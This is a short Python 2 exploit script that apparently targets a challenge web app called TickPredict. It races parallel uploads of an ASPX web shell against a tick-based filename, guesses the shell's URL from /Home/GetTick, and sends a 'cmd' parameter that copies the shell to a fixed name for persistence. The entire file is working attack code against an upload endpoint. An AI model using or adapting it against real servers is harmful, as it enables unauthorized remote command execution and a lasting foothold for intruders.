import grequests
import re
import urllib
import sys
from threading import Thread

host=sys.argv[1]
port=int(sys.argv[2])
delay=int(sys.argv[3])

class Ticker(Thread):
    def __init__(self,host,port):
        Thread.__init__(self)
        self.host=host
        self.port=port

    def run(self):
        urls=["http://%s:%d/Home/GetTick" % (self.host,self.port) for i in xrange(0,10)]
        rs=(grequests.get(u) for u in urls)
        responses=grequests.map(rs)
        ticks=set()
        for r in responses:
            tick=long(re.search("<h3>([0-9]+)",r.content).group(1))
            ticks.add(tick-1)
            ticks.add(tick)
            ticks.add(tick+1)

        persistence_command="copy c:\\TickPredict\\Content\\%d_shell.aspx c:\\TickPredict\\Content\\shell.aspx"
        for x in xrange(0,4):
            guess_urls=["http://%s:%d/Content/%d_shell.aspx?cmd=%s" % (self.host,self.port,t,urllib.quote(persistence_command % t)) for t in ticks]
            rs=(grequests.get(u) for u in guess_urls)
            responses=grequests.map(rs)

            for r in responses:
                #print r.request.url.split("/")[-1], r.status_code
                if r.status_code != 404:
                    print "Success!", r.request.url, r.status_code
                    print r.content
        for t in ticks:
            print t

class Uploader(Thread):
    def __init__(self,host,port,delay):
        Thread.__init__(self)
        self.host=host
        self.port=port
        self.delay=delay

    def run(self):
        urls=["http://%s:%d/Home/Upload" % (self.host,self.port) for i in xrange(0,10)]
        contents=open("shell.aspx","rb").read()
        rs=(grequests.post(u,files={"file":("shell.aspx",contents)},data={"delay":self.delay}) for u in urls)
        #rs=(grequests.get(u) for u in urls)
        responses=grequests.map(rs)
        for r in responses:
            if r.status_code==200:
                print re.search("###([^#]+)###",r.content).group(1), "(UPLOAD)"
                #pass
            else:
                print "UPLOADER: %d" % r.status_code
        
u=Uploader(host,port,delay)
t=Ticker(host,port)

u.start()
t.start()



